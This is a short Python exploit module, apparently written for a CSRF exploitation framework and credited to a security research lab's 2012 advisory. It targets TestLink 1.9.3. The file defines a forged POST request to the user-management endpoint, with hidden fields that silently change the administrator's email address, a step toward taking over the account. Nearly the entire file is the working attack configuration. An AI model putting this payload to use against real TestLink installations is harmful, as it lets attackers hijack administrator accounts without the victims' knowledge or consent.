# -*- coding: utf-8 -*-

NAME = "TestLink 1.9.3 CSRF Vulnerability"
DESCRIPTION = '''The application allows authorized users to perform certain actions via HTTP requests without making proper validity checks to verify the source of the requests. This can be exploited to add, delete or modify sensitive information, for example to change administrator's email.
This exploit will change administrator's email.'''
AUTHOR = "High-Tech Bridge Security Research Lab"
AUTHOR_URL = "https://www.htbridge.com/advisory/"
DATE = "2012-09-07"

METHOD = "POST"
PATH = "/lib/usermanagement/userInfo.php"
FORM = {
    "name": "main",
    "id": "main"
}

PARAMS = [
    {
        "type": "hidden",
        "name": "doAction",
        "value": "editUser",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "lastName",
        "value": "LastName",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "firstName",
        "value": "FirstName",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "emailAddress",
        "value": "new@mail.com",
        "custom": True,
        "description": "New administator's email"
    }
]